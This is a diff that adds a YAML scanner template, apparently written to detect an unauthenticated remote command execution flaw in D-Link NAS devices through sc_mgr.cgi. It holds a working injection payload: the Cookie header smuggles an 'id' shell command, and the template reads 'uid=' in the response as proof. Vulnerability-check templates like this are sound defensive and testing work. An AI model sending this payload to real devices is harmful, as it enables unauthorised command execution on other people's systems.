@@ -1,0 +1,22 @@
+id:
+info:
+  name: D-Link NAS设备 sc_mgr.cgi 未授权RCE
+  severity: 4
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+    Accept: '*/*'
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Cookie: username=mopfdfsewo'& id & echo 'mopfdfsewo;
+response1:
+  headers:
+  body: uid=
+  code: 200
+requests2:
+response2:
